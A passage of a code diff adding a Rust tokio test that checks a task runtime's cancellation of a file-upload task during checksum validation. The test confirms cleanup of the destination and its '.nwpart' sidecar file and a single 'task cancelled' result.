+        assert!(runtime.kill_task(&next.id).await);
+        next_runner.await.unwrap();
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn accepted_cancellation_beats_upload_checksum_failure_and_cleans_sidecar() {
+        let runtime = Arc::new(runtime());
+        let directory = tempfile::tempdir().unwrap();
+        let destination = directory.path().join("checksum-cancel.bin");
+        let transfer_id = Uuid::new_v4();
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "nw/upload".into(),
+            args: vec![
+                destination.to_string_lossy().into_owned(),
+                transfer_id.to_string(),
+                "3".into(),
+                "00".repeat(32),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(task.id));
+        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            while runtime.upload.read().unwrap().is_none() {
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .unwrap();
+        let (reached_tx, reached_rx) = std::sync::mpsc::channel();
+        let (release_tx, release_rx) = std::sync::mpsc::channel();
+        {
+            let mut slot = runtime.upload.write().unwrap();
+            let upload = slot
+                .as_mut()
+                .and_then(|active| active.transfer.as_mut())
+                .unwrap();
+            upload
+                .write_chunk(&nw_profile::msgs::FileChunk {
+                    transfer_id: Some(transfer_id),
+                    task_id: Some(task.id),
+                    name: destination.to_string_lossy().into_owned(),
+                    offset: 0,
+                    total: 3,
+                    data: b"new".to_vec(),
+                })
+                .unwrap();
+            upload.set_validation_channels(reached_tx, release_rx);
+        }
+        let finalizer = {
+            let runtime = Arc::clone(&runtime);
+            tokio::spawn(async move {
+                runtime
+                    .finalize_upload(FileAck {
+                        transfer_id: Some(transfer_id),
+                        received: 3,
+                        total: 3,
+                        done: true,
+                    })
+                    .await;
+            })
+        };
+        tokio::task::spawn_blocking(move || reached_rx.recv_timeout(Duration::from_secs(2)))
+            .await
+            .unwrap()
+            .expect("hash validation boundary");
+
+        assert!(runtime.kill_task(&task.id).await);
+        release_tx.send(()).unwrap();
+        finalizer.await.unwrap();
+        runner.await.unwrap();
+
+        assert!(!destination.exists());
+        assert!(
+            !directory
+                .path()
+                .join(format!("checksum-cancel.bin.nwpart-{transfer_id}"))
+                .exists()
+        );
+        let results = runtime.pending.lock().unwrap();
+        let terminal = results
+            .iter()
+            .filter(|result| result.task_id == task.id)
+            .collect::<Vec<_>>();
+        assert_eq!(terminal.len(), 1);
+        assert_eq!(terminal[0].stderr, b"task cancelled");
     }
 
     #[test]
